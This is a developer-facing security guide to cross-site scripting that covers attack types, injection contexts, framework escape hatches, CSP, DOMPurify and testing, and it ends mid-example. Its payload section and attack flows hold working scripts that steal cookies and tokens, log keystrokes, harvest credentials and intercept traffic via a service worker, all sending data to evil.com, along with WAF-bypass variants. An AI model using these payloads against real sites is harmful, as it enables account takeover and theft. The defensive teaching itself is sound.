# Cross-Site Scripting (XSS)

> **Category:** Security
> **Version:** 1.0.0
> **OWASP:** A03:2021 — Injection
> **CWE:** CWE-79
> **CVSS (critical stored XSS):** 8.8 (High)

---

## Table of Contents

1. [Overview](#1-overview)
2. [How XSS Works](#2-how-xss-works)
3. [Types of XSS](#3-types-of-xss)
4. [XSS Attack Payloads](#4-xss-attack-payloads)
5. [Context-Specific XSS](#5-context-specific-xss)
6. [DOM-Based XSS — Deep Dive](#6-dom-based-xss--deep-dive)
7. [Framework-Specific Vulnerabilities](#7-framework-specific-vulnerabilities)
8. [Content Security Policy](#8-content-security-policy)
9. [Defense Mechanisms](#9-defense-mechanisms)
10. [DOMPurify — Implementation Guide](#10-dompurify--implementation-guide)
11. [Detection and Testing](#11-detection-and-testing)
12. [Vulnerable Examples](#12-vulnerable-examples)
13. [Secure Examples](#13-secure-examples)
14. [Anti-Patterns](#14-anti-patterns)
15. [Threat Model](#15-threat-model)
16. [Compliance Mapping](#16-compliance-mapping)
17. [Checklist](#17-checklist)
18. [References](#18-references)

---

## 1. Overview

Cross-Site Scripting (XSS) is an injection attack where malicious scripts are injected into content served from a trusted website. Unlike SQL injection (which targets the server), XSS targets users of the application by executing JavaScript in their browser under the trusted origin.

**What an attacker can do with XSS:**
- Steal session cookies and tokens → account takeover
- Capture keystrokes (keyloggers in JavaScript)
- Exfiltrate form data (passwords, credit card numbers as they are typed)
- Redirect users to phishing sites
- Manipulate the DOM (fake login forms, malicious UI)
- Perform actions on behalf of the user (CSRF via XSS)
- Mine cryptocurrency in the victim's browser
- Persist via Service Worker installation
- Lateral movement within an intranet (SSRF via browser, BeEF hooked browsers)

**Why XSS is still prevalent in 2025:**
- The web's fundamental model allows HTML + CSS + JavaScript from a single origin
- Modern frameworks help but do not eliminate the risk (template engine bypasses, `dangerouslySetInnerHTML`)
- Third-party scripts (analytics, ads, chat widgets) run with full page privileges
- DOM manipulation patterns learned before security awareness
- Markdown renderers, rich text editors, and preview features are common injection points

---

## 2. How XSS Works

### The Same-Origin Policy and Why XSS Breaks It

Browsers enforce the Same-Origin Policy (SOP): JavaScript at `https://bank.com` cannot read data from `https://attacker.com`. This is the fundamental browser security model.

XSS breaks SOP by executing the attacker's code **within** the victim's origin. The browser sees the script as coming from `https://bank.com` (because it was injected into that page), so it runs with full access to:
- Cookies for `bank.com` (including session cookies)
- localStorage and sessionStorage for `bank.com`
- The full DOM (can read account numbers, transfer forms, messages)
- Can make authenticated API calls to `bank.com`'s endpoints

### The Injection Model

```
Normal:   User → Request → Server → HTML (safe content) → Browser renders
XSS:      Attacker → Injects script into data store
          User → Request → Server → HTML (contains attacker script) → Browser EXECUTES
```

---

## 3. Types of XSS

### 3.1 Reflected XSS

The malicious script is part of the HTTP request (URL parameter, form field) and is immediately "reflected" back in the HTTP response without being stored.

**Characteristics:**
- Not persistent (no storage in DB)
- Requires social engineering to deliver (victim must click a crafted URL)
- Detected by URL scanners (Google Safe Browsing, phishing filters)
- Most common in search results, error messages, redirect parameters

**Attack flow:**
```
1. Attacker crafts URL: https://victim.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>
2. Attacker sends this URL to victim (email, message, QR code)
3. Victim clicks URL → browser requests page
4. Server includes q parameter in response: "Results for: <script>...</script>"
5. Browser executes attacker script within victim.com origin
6. Session cookie sent to evil.com
```

**Real-world example — Google (2005):**
The first widely-reported XSS in a major web application was in Google's search results, where query parameters were reflected without encoding.

### 3.2 Stored XSS (Persistent)

The malicious script is stored in the application's data store (database, file, cache) and is served to any user who views the affected page.

**Characteristics:**
- Persistent — attack fires for every user who views the page
- No social engineering needed (attack happens passively)
- Can target high-value users (admins, support staff, other customers)
- Higher impact per attack than reflected

**Attack flow:**
```
1. Attacker submits a post/comment/profile field containing: <script>fetch('https://evil.com?c='+document.cookie)</script>
2. Server stores it in database without sanitization
3. Any user who views the post triggers the script
4. Attacker receives session cookies of every affected user
```

**High-value targets:**
- Admin panels that display user-submitted content (support tickets, feedback, comments)
- User profile display names (injected script runs for every user who sees the profile)
- Product reviews (runs for every customer on the product page)
- Chat applications (runs for every participant)
- Log viewers (stored XSS in log entries, runs for admin who views logs)

### 3.3 DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript. The server response is safe, but JavaScript reads from a tainted source (URL fragment, query parameter, localStorage) and writes to a dangerous sink without sanitization.

**Key distinction:** The server is never involved in the injection. The attack executes purely through client-side JavaScript.

**Sources (tainted input):**
```javascript
document.URL
document.location.href
document.location.hash
document.location.search
document.referrer
window.name
document.cookie
localStorage.getItem('...')
postMessage data
WebSocket messages
```

**Sinks (dangerous output):**
```javascript
element.innerHTML = ...
element.outerHTML = ...
document.write(...)
document.writeln(...)
element.insertAdjacentHTML(...)
eval(...)
Function(...)
setTimeout(string, ...)
setInterval(string, ...)
location.href = ...    // DOM-based open redirect
location.assign(...)
location.replace(...)
```

**Example:**
```javascript
// VULNERABLE — reads URL hash and writes to DOM
const theme = location.hash.slice(1)  // e.g., #dark
document.getElementById('theme').innerHTML = `<span class="${theme}">Hello</span>`

// Attack URL: https://victim.com/page#"><img src=x onerror=alert(1)>
// The hash value is not sent to the server — scanner won't see it
// Browser executes: innerHTML = '<span class=""><img src=x onerror=alert(1)>">Hello</span>'
```

---

## 4. XSS Attack Payloads

### Basic Proof of Concept

```html
<!-- Basic alert — used to confirm execution -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
```

### Cookie Exfiltration

```html
<!-- Send cookies to attacker server -->
<script>
  new Image().src = 'https://evil.com/steal?c=' + encodeURIComponent(document.cookie)
</script>

<!-- Fetch API version -->
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookies: document.cookie, url: location.href }),
    mode: 'no-cors'
  })
</script>
```

### Session Token Theft (localStorage)

```html
<script>
  const token = localStorage.getItem('auth_token') 
             || sessionStorage.getItem('sb-esnlofmuwqdsfayaepdu-auth-token')
  fetch('https://evil.com/steal?t=' + encodeURIComponent(token), { mode: 'no-cors' })
</script>
```

### Keylogger

```html
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://evil.com/log?k=' + e.key + '&u=' + location.href, { mode: 'no-cors' })
  })
</script>
```

### Credential Harvest (fake login overlay)

```html
<script>
  const overlay = document.createElement('div')
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999'
  overlay.innerHTML = `
    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:40px;border-radius:8px;min-width:300px">
      <h2>Session Expired</h2>
      <p>Please re-enter your credentials to continue.</p>
      <input type="email" id="steal-email" placeholder="Email" style="width:100%;margin:8px 0;padding:8px;box-sizing:border-box">
      <input type="password" id="steal-pass" placeholder="Password" style="width:100%;margin:8px 0;padding:8px;box-sizing:border-box">
      <button onclick="stealCreds()" style="width:100%;padding:10px;background:#0070f3;color:#fff;border:none;border-radius:4px;cursor:pointer">Sign In</button>
    </div>
  `
  document.body.appendChild(overlay)
  
  function stealCreds() {
    const email = document.getElementById('steal-email').value
    const pass = document.getElementById('steal-pass').value
    fetch('https://evil.com/creds', {
      method: 'POST',
      body: JSON.stringify({ email, pass }),
      mode: 'no-cors'
    })
    overlay.remove()
  }
</script>
```

### Service Worker Persistence (Advanced)

```html
<script>
  // Register a malicious service worker that intercepts all requests
  if ('serviceWorker' in navigator) {
    const swCode = `
      self.addEventListener('fetch', e => {
        const req = e.request.clone()
        req.text().then(body => {
          fetch('https://evil.com/intercept', {
            method: 'POST',
            body: JSON.stringify({ url: req.url, body }),
            mode: 'no-cors'
          })
        })
      })
    `
    const blob = new Blob([swCode], { type: 'application/javascript' })
    navigator.serviceWorker.register(URL.createObjectURL(blob))
    // Persists even after the XSS payload is removed
  }
</script>
```

### WAF Bypass Payloads

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Malformed tags that browsers repair -->
<script >alert(1)</script >
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Event handler alternatives (no <script> tag needed) -->
<img src="x" onerror="alert(1)">
<details open ontoggle="alert(1)">
<input autofocus onfocus="alert(1)">
<select autofocus onfocus="alert(1)">
<textarea autofocus onfocus="alert(1)">
<keygen autofocus onfocus="alert(1)">
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>

<!-- SVG-based (bypasses many HTML sanitizers) -->
<svg><script>alert(1)</script></svg>
<svg onload="alert(1)">
<svg><animate onbegin="alert(1)" attributeName="x">

<!-- HTML entities (when entity decoding happens before filter) -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&lt;script&gt;alert(1)&lt;/script&gt;  <!-- Only bypasses double-decode scenarios -->

<!-- JavaScript: URI -->
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">

<!-- data: URI -->
<iframe src="data:text/html,<script>alert(1)</script>">

<!-- Expression-based (older IE) -->
<style>body{background:expression(alert(1))}</style>
```

---

## 5. Context-Specific XSS

The injection context determines which characters are dangerous and which encoding to apply.

### HTML Body Context

```html
<!-- Input appears between HTML tags -->
<div>USER_INPUT_HERE</div>

<!-- Defense: HTML entity encoding -->
< → &lt;
> → &gt;
& → &amp;
" → &quot;
' → &#x27;

<!-- Attack: <script>alert(1)</script> → becomes &lt;script&gt;alert(1)&lt;/script&gt; → safe -->
```

### HTML Attribute Context

```html
<!-- Input appears inside an HTML attribute -->
<div class="USER_INPUT">content</div>
<input value="USER_INPUT">
<a href="USER_INPUT">link</a>  <!-- Special case: href allows javascript: -->

<!-- Attacks -->
<div class=""><script>alert(1)</script>">
<input value="" onmouseover="alert(1)">

<!-- Defense: HTML attribute encoding (encode all non-alphanumeric chars) -->
<!-- NEVER: <div class="' + userInput + '"> -->
<!-- Always: use safe DOM APIs instead -->
element.setAttribute('class', userInput)  // Safe — does not parse HTML
element.className = userInput             // Safe
```

### JavaScript String Context

```html
<script>
  var username = 'USER_INPUT';  // Input appears inside JS string
</script>

<!-- Attacks -->
var username = 'admin'; alert(1); var x = ''; // breaks out of string
var username = '</script><script>alert(1)</script>'; // breaks out of script block

<!-- Defense -->
<!-- Use JSON.stringify() for values that must appear in JavaScript -->
<script>
  var username = <%= JSON.stringify(userInput) %>;
  // OR pass data via data attributes and read from DOM -->
</script>
<div id="app" data-username="USER_INPUT_HTML_ENCODED"></div>
<script>
  var username = document.getElementById('app').dataset.username;
  // dataset reads the HTML-decoded value safely
</script>
```

### URL Context

```html
<!-- Input appears in a URL -->
<a href="https://example.com/profile/USER_INPUT">View Profile</a>
<a href="/redirect?url=USER_INPUT">Continue</a>

<!-- Attacks -->
<a href="javascript:alert(1)">  <!-- javascript: protocol -->
<a href="data:text/html,<script>alert(1)</script>">
<a href="/redirect?url=https://evil.com">  <!-- open redirect -->

<!-- Defense -->
<!-- Validate URL scheme (only allow http:, https:) -->
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin)
    return ['http:', 'https:'].includes(parsed.protocol)
  } catch {
    return false
  }
}

<!-- For relative URLs (redirect parameter) validate against allowlist of paths -->
const ALLOWED_REDIRECT_PATHS = ['/dashboard', '/profile', '/bookings']
const redirect = new URL(params.get('redirect'), window.location.origin)
if (redirect.origin === window.location.origin && ALLOWED_REDIRECT_PATHS.includes(redirect.pathname)) {
  location.href = redirect.href
}
```

### CSS Context

```html
<!-- Input appears in CSS -->
<style>
  .user-color { color: USER_INPUT; }
</style>
<div style="color: USER_INPUT;">

<!-- Attacks (older browsers) -->
color: expression(alert(1))     /* IE */
color: url('javascript:alert(1)')

<!-- Modern attack: CSS injection for data exfiltration -->
input[value^="a"] { background: url('https://evil.com/steal?v=a') }
input[value^="b"] { background: url('https://evil.com/steal?v=b') }
/* This exfiltrates the value of input fields character by character */

<!-- Defense: CSS value allowlisting -->
const SAFE_COLORS = /^#[0-9a-f]{3,6}$|^rgb\(\d+,\s*\d+,\s*\d+\)$|^(red|blue|green|...)$/i
if (!SAFE_COLORS.test(userColor)) throw new Error('Invalid color')
element.style.color = userColor
```

---

## 6. DOM-Based XSS — Deep Dive

### Source-to-Sink Analysis

Every DOM XSS vulnerability has:
1. A **source** — where tainted data enters the client-side JavaScript
2. A **sink** — where tainted data is used in a dangerous way

**Mapping sources to sinks:**

```
document.URL → innerHTML           → XSS
location.hash → eval()             → XSS
postMessage → document.write()     → XSS
localStorage → setTimeout(string)  → XSS
WebSocket → location.href          → Open Redirect
```

### Common DOM XSS Patterns

**Pattern 1: URL parameter to innerHTML**
```javascript
// VULNERABLE
const params = new URLSearchParams(location.search)
document.getElementById('welcome').innerHTML = 'Hello, ' + params.get('name')

// Attack: ?name=<img src=x onerror=alert(1)>
```

**Pattern 2: Hash-based routing**
```javascript
// VULNERABLE — common in single-page apps
function route() {
  const path = location.hash.slice(1)
  document.getElementById('content').innerHTML = templates[path] || 'Not found: ' + path
}
window.addEventListener('hashchange', route)

// Attack: #<img src=x onerror=alert(1)>
```

**Pattern 3: jQuery html() method**
```javascript
// VULNERABLE — jQuery's html() is equivalent to innerHTML
$('#message').html(userInput)
$('#content').append('<div>' + userInput + '</div>')

// Safe jQuery alternatives
$('#message').text(userInput)     // Sets textContent — safe
$('#message').val(userInput)      // Sets value — safe for inputs
```

**Pattern 4: postMessage without origin validation**
```javascript
// VULNERABLE — any page can send postMessage
window.addEventListener('message', function(event) {
  document.getElementById('output').innerHTML = event.data
})

// CORRECT
window.addEventListener('message', function(event) {
  if (event.origin !== 'https://trusted-parent.com') return
  document.getElementById('output').textContent = event.data  // textContent, not innerHTML
})
```

**Pattern 5: AngularJS template injection (client-side)**
```javascript
// VULNERABLE — AngularJS 1.x with user content in template
<div ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>

// AngularJS evaluates {{ }} expressions — this executes JavaScript
// Attack via URL: https://victim.com/page?name={{constructor.constructor('alert(1)')()}}
// If name is reflected into a template context
```

### DOM Clobbering

A lesser-known DOM XSS variant where the attacker injects HTML elements that override JavaScript global variables.

```html
<!-- Attacker injects this HTML (no script tags needed) -->
<form id="config">
  <input name="apiUrl" value="https://evil.com">
</form>

<!-- Vulnerable application code -->
<script>
  // Developer expects config to be a JS object
  fetch(config.apiUrl + '/api/data')  // config is now the <form> element
  // config.apiUrl = the <input> element
  // config.apiUrl.toString() → returns 'https://evil.com'
  // Fetch goes to evil.com
</script>
```

**DOM Clobbering targets:**
- `window.name` — always a string, can be set by parent frames
- Any global variable that developers forget to declare with `var/let/const`
- `document.getElementById('config')` used as a settings object

---

## 7. Framework-Specific Vulnerabilities

### React

React is XSS-safe by default — JSX auto-encodes. But several escape hatches exist.

```jsx
// SAFE — React HTML-encodes by default
function Greeting({ name }) {
  return <div>Hello {name}</div>  // name is automatically encoded
}

// VULNERABLE — dangerouslySetInnerHTML
function RichContent({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />  // DANGEROUS
}

// CORRECT — sanitize before setting HTML
import DOMPurify from 'dompurify'

function RichContent({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel']
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// VULNERABLE — href with javascript:
function Link({ url }) {
  return <a href={url}>Click</a>  // url could be javascript:alert(1)
}

// CORRECT — validate URL scheme
function Link({ url }) {
  const isValidUrl = url.startsWith('https://') || url.startsWith('http://')
  if (!isValidUrl) return <span>Invalid link</span>
  return <a href={url} rel="noopener noreferrer">Click</a>
}

// VULNERABLE — dynamic component rendering via eval-like patterns
const Component = components[userInput]  // if userInput can be arbitrary
return <Component />

// VULNERABLE — server-side rendered props that get reflected
// Next.js: if user input goes into getServerSideProps and into HTML head
export async function getServerSideProps({ query }) {
  return { props: { title: query.title } }  // reflected in <title>
}
// Attack: ?title=</title><script>alert(1)</script>
// Next.js automatically escapes in JSX — but if used in a raw HTML context, it won't
```

### Vue.js

```vue
<!-- SAFE — Vue auto-escapes -->
<template>
  <div>{{ userContent }}</div>
</template>

<!-- VULNERABLE — v-html directive -->
<template>
  <div v-html="userContent"></div>  <!-- DANGEROUS — same as innerHTML -->
</template>

<!-- CORRECT — sanitize with v-html -->
<template>
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify'
export default {
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userContent)
    }
  }
}
</script>

<!-- VULNERABLE — Vue template injection (server-rendered) -->
<!-- If user content is placed in a Vue template before compilation -->
<div>{{ '<script>alert(1)</script>' }}</div>  <!-- Safe: double encoding -->
<!-- But: new Function() used in templates can be exploited -->
```

### Angular

```typescript
// Angular uses DomSanitizer for HTML binding
// SAFE — Angular escapes interpolation
@Component({ template: '<div>{{userContent}}</div>' })

// VULNERABLE — bypassSecurityTrustHtml
import { DomSanitizer } from '@angular/platform-browser'

constructor(private sanitizer: DomSanitizer) {}

// DANGEROUS — bypasses Angular's built-in sanitization
getSafeHtml(html: string) {
  return this.sanitizer.bypassSecurityTrustHtml(html)  // DANGEROUS
}

// CORRECT — use Angular's sanitize instead
getSafeHtml(html: string) {
  // Angular sanitizes by default when using [innerHTML]
  // Only use bypassSecurityTrust* when you are 100% certain the source is safe
  return html  // Let Angular sanitize it automatically via [innerHTML]
}
```

### Next.js / Server-Side Rendering

```typescript
// VULNERABLE — user data in script tags (next.js pages)
export default function Page({ userMeta }) {
  return (
    <Head>
      <script dangerouslySetInnerHTML={{
        __html: `window.__USER__ = ${JSON.stringify(userMeta)}`
        // If userMeta.name = '{"name": "</script><script>alert(1)</script>"}
        // JSON.stringify doesn't escape </script>
      }} />
    </Head>
  )
}

// CORRECT — serialize safely
function jsonStringifyForScript(obj) {
  return JSON.stringify(obj)
    .replace(/</g, '\\u003c')   // </script> cannot appear in JSON
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/ /g, '\\u2028')
    .replace(/ /g, '\\u2029')
}
```

---

## 8. Content Security Policy

CSP is the most powerful XSS mitigation available at the browser level. It defines which sources of content are allowed to execute on the page.

### CSP Directives

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' https: data:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

**Directive reference:**

| Directive | Controls | Recommended Value |
|---|---|---|
| `default-src` | Fallback for all fetch directives | `'self'` |
| `script-src` | JavaScript sources | `'self'` + nonces |
| `style-src` | CSS sources | `'self'` + `'unsafe-inline'` if needed |
| `img-src` | Image sources | `'self' https: data:` |
| `connect-src` | fetch, XHR, WebSocket | `'self' https://api.domain.com` |
| `font-src` | Web fonts | `'self' fonts.gstatic.com` |
| `frame-src` | `<iframe>` sources | `'none'` or specific |
| `frame-ancestors` | Who can embed this page | `'none'` |
| `object-src` | `<object>`, `<embed>` | `'none'` |
| `base-uri` | `<base>` tag restrictions | `'self'` |
| `form-action` | Form submission targets | `'self'` |

### Nonce-Based CSP (Strongest Protection)

```html
<!-- Server generates a unique nonce per request -->
<!-- Response header -->
Content-Security-Policy: script-src 'nonce-rAnd0mN0nc3'

<!-- HTML: only scripts with the matching nonce execute -->
<script nonce="rAnd0mN0nc3">
  // This executes
</script>

<script>
  alert('injected!')  // This is BLOCKED — no nonce
</script>
```

**Nonce implementation (Node.js / Express):**
```typescript
import crypto from 'crypto'
import { Request, Response, NextFunction } from 'express'

function cspMiddleware(req: Request, res: Response, next: NextFunction) {
  const nonce = crypto.randomBytes(16).toString('base64')
  res.locals.cspNonce = nonce

  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' https://cdn.jsdelivr.net`,
    `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`,
    `img-src 'self' https: data: blob:`,
    `connect-src 'self' https://esnlofmuwqdsfayaepdu.supabase.co wss://esnlofmuwqdsfayaepdu.supabase.co`,
    `font-src 'self' https://fonts.gstatic.com`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `frame-ancestors 'none'`,
    `upgrade-insecure-requests`,
  ].join('; '))

  next()
}

// In template: <script nonce="<%= nonce %>">
```

### Hash-Based CSP (for Static Sites)

```html
<!-- For inline scripts that cannot use nonces -->
<!-- Compute: echo -n 'alert(1)' | openssl dgst -sha256 -binary | openssl base64 -A -->

Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng='
```

### CSP Anti-Patterns (Bypasses)

```
# INSECURE — 'unsafe-inline' allows all inline scripts
script-src 'self' 'unsafe-inline'

# INSECURE — 'unsafe-eval' allows eval()
script-src 'self' 'unsafe-eval'

# INSECURE — wildcard domain allows any subdomain (XSS via compromised CDN)
script-src *

# INSECURE — data: URI allows data: script execution
script-src 'self' data:

# BYPASS — angular.js JSONP endpoint on allowlisted domain
script-src https://accounts.google.com
# Attack: <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">

# BYPASS — open redirects on allowlisted domains
# BYPASS — JSONP endpoints on allowlisted CDNs
```

### CSP Reporting

```
# Add report-uri to collect violations
Content-Security-Policy: ...; report-uri https://csp-report.yourdomain.com/csp

# Or use report-to (modern)
Content-Security-Policy: ...; report-to csp-endpoint
Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"https://..."}]}

# Start with report-only mode to avoid breaking the site
Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report
```

---

## 9. Defense Mechanisms

### Defense Layer 1: Output Encoding (Primary)

Use the right encoding for the right context:

```typescript
// Universal HTML encoding function
function encodeHTML(s: string): string {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;')
}

// Use textContent instead of innerHTML for plain text
element.textContent = userInput      // SAFE — never parses HTML
element.setAttribute('data-x', val) // SAFE — attribute API encodes
element.className = userInput        // SAFE — sets class without HTML parsing

// JavaScript context — use JSON.stringify
const userData = JSON.stringify({ name: userInput })
// Produces: {"name":"safe string"} with all quotes escaped
```

### Defense Layer 2: Input Validation

```typescript
// Reject input with HTML characters when HTML is not needed
function validatePlainText(input: string, maxLength: number): string {
  if (typeof input !== 'string') throw new ValidationError('Expected string')
  if (input.length > maxLength) throw new ValidationError(`Max length is ${maxLength}`)
  if (/<|>|script|javascript|onerror|onload/i.test(input)) {
    throw new ValidationError('Invalid characters in input')
  }
  return input.trim()
}

// For URLs, validate scheme
function validateUrl(url: string): string {
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    throw new ValidationError('Invalid URL')
  }
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new ValidationError('Only HTTP and HTTPS URLs are allowed')
  }
  return parsed.href
}
```

### Defense Layer 3: HttpOnly Cookies

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
```

`HttpOnly` prevents JavaScript from reading the cookie. If XSS occurs, `document.cookie` will not return the session token — the attacker cannot steal it. This does not prevent XSS execution but severely limits its impact.

### Defense Layer 4: Subresource Integrity (SRI)

```html
<!-- Third-party scripts must include integrity hash -->
<script
  src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.0/dist/umd/supabase.min.js"
  integrity="sha256-HASH_HERE"
  crossorigin="anonymous">
</script>

<!-- Generate hash -->
<!-- curl -s https://cdn.example.com/lib.js | openssl dgst -sha256 -binary | openssl base64 -A -->
```

If the CDN is compromised and serves a different file, the hash won't match and the browser won't load it.

---

## 10. DOMPurify — Implementation Guide

DOMPurify is the leading, battle-tested HTML sanitization library.

**Installation:**
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

**Basic usage:**
```typescript
import DOMPurify from 'dompurify'

// Default — removes all dangerous elements and attributes
const clean = DOMPurify.sanitize(dirtyHtml)
element.innerHTML = clean
```

**Custom configuration:**
```typescript
// Strict — only allow specific safe tags
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'title', 'target'],
  ALLOWED_URI_REGEXP: /^(https?:|mailto:)/i,  // Only allow http, https, mailto in href
})

// Allow only text formatting — no links
const textOnly = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'],
  ALLOWED_ATTR: []
})

// Strip all HTML — plain text only
const plainText = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: [],
  ALLOWED_ATTR: []
})
// Note: DOMPurify.sanitize with empty tags returns text content, not HTML

// Force target="_blank" to be safe
DOMPurify.addHook('afterSanitizeAttributes', function(node) {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }
})

const clean = DOMPurify.sanitize(dirtyHtml)
```

**Server-side DOMPurify (Node.js):**
```typescript
// DOMPurify requires a DOM — use jsdom for server-side use
import { JSDOM } from 'jsdom'
import DOMPurify from 'dompurify'

const { window } = new JSDOM('')
const purify = DOMPurify(window)

function sanitizeServerSide(html: string): string {
  return purify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href']
  })
}
```

**React integration:**
```tsx
import DOMPurify from 'dompurify'

interface SafeHtmlProps {
  html: string
  allowedTags?: string[]
}

function SafeHtml({ html, allowedTags }: SafeHtmlProps) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowedTags ?? ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

---

## 11. Detection and Testing

### Manual Testing Checklist

For each user-controllable input field (form field, URL param, header, cookie):

```
1. Submit: <script>alert(document.domain)</script>
   Expected: script tag appears as text (encoded), no alert

2. Submit: <img src=x onerror=alert(1)>
   Expected: broken image icon, no alert

3. Submit: javascript:alert(1)
   Expected (in links): not clickable as JS, or link refused

4. Submit: " onmouseover="alert(1)
   Expected: attribute value contains literal quote, no event added

5. Submit: ' onfocus='alert(1)
   Expected: same

6. Submit: --><script>alert(1)</script><!--
   Expected: appears as text in HTML comments context

7. Check DOM-based vectors via browser devtools:
   - Add event listener breakpoint on innerHTML
   - Search for eval() calls in Sources panel
   - Check for URL/hash reading in page JavaScript
```

### Browser Developer Tools for DOM XSS

```javascript
// In browser console — find innerHTML usages
// This is for testing your own application

// Override innerHTML setter to log all usages
const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML')
Object.defineProperty(Element.prototype, 'innerHTML', {
  set: function(value) {
    console.trace('innerHTML set:', value.substring(0, 100))
    return originalInnerHTML.set.call(this, value)
  }
})

// Find all inline event handlers (potential sinks)
document.querySelectorAll('[onclick],[onmouseover],[onfocus],[onerror]')

// Find all script tags with external source
document.querySelectorAll('script[src]')
```

### Automated Tools

| Tool | Type | Best For |
|---|---|---|
| Burp Suite Scanner | Active scan | Reflected and stored XSS in HTTP responses |
| OWASP ZAP | Active scan | Open source alternative to Burp |
| Dalfox | CLI | Fast XSS parameter scanner |
| XSStrike | CLI | Advanced XSS detection + WAF bypass |
| DOM Invader (Burp) | Browser extension | DOM-based XSS |
| Semgrep | SAST | Static analysis for XSS patterns in code |

```bash
# Dalfox — fast XSS scanner
dalfox url "https://target.com/search?q=test"
dalfox url "https://target.com/search?q=test" --cookie "session=abc"

# XSStrike — with WAF bypass attempts
python3 xsstrike.py -u "https://target.com/search?q=test"

# Burp Suite — automated scan
# Use Burp's active scanner on scope; set custom insertion points for headers
```

---

## 12. Vulnerable Examples

### Example 1: Search Results Page (Reflected)

```python
# Flask — VULNERABLE
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = db.search(query)
    # VULNERABLE — query is reflected without encoding
    return f'<h2>Results for: {query}</h2>' + render_results(results)

# Attack: /search?q=<script>alert(1)</script>
```

### Example 2: User Comment (Stored)

```javascript
// Express — VULNERABLE stored XSS
app.post('/comments', async (req, res) => {
  const { content } = req.body
  // Stored without sanitization
  await db.query('INSERT INTO comments (content) VALUES ($1)', [content])
  res.json({ success: true })
})

// Comment display — VULNERABLE
app.get('/post/:id', async (req, res) => {
  const comments = await db.query('SELECT content FROM comments WHERE post_id = $1', [req.params.id])
  // content is inserted directly into HTML
  const html = comments.rows.map(c => `<div class="comment">${c.content}</div>`).join('')
  res.send(`<html><body>${html}</body></html>`)
})
```

### Example 3: DOM XSS via URL Fragment

```html
<!-- VULNERABLE SPA routing -->
<!DOCTYPE html>
<html>
<body>
  <div id="content"></div>
  <script>
    function loadPage() {
      const page = location.hash.slice(1) || 'home'
      // VULNERABLE — page name from URL hash goes directly to innerHTML
      document.getElementById('content').innerHTML = '<h1>' + page + '</h1>'
    }
    window.addEventListener('hashchange', loadPage)
    loadPage()
  </script>
</body>
</html>
<!-- Attack: https://victim.com/#<img src=x onerror=alert(1)> -->
```

### Example 4: Angular Template Injection

```typescript
// VULNERABLE — user input in AngularJS template
@Component({
  template: `
    <div [innerHTML]="userBio"></div>  <!-- VULNERABLE if userBio contains HTML -->
  `
})
export class ProfileComponent {
  // If bypassing Angular's sanitizer
